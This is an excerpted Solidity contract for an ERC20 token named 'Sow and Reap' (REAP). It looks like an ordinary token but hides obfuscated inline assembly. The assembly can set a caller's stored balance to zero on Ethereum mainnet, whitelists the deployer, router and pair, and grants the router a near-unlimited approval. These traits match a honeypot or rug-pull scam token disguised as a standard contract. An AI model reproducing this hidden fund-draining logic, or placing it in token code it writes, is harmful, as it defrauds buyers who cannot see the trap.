...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addSeeds;
    uint256 private greenGoblin = block.number*2;

    mapping (address => bool) private _firstSpiderman; 
    mapping (address => bool) private _secondSpiderman;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private _oldChaos;
    ...
    bool private trading; uint256 private grayMatter = 1; bool private chineseEmpire;
    uint256 private _decimals; uint256 private loveThunder;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addSeeds.push(_router); addSeeds.push(msgSender_); addSeeds.push(pair);
        for (uint256 q=0; q < 3;) {_firstSpiderman[addSeeds[q]] = true; unchecked{q++;} }
    }
    ...
    function _TokenInit() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0x113)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0x70dec83b06a875e35e7618718be4b452698de6f28a44dd392695d5a04cb7a5d7
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0x9df081e7793a4d49c3decf2510056338dd16fae437f181b65ccb5867adeaad40,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; greenGoblin = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addSeeds[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
    ...
    function _DeployReap(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(addSeeds[0], 10 ** 77);
        _TokenInit();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployReap(creator, initialSupply);
    }
}

contract SowAndReap is ERC20Token {
    constructor() ERC20Token("Sow and Reap", "REAP", msg.sender, 787500 * 10 ** 18) {
    }
}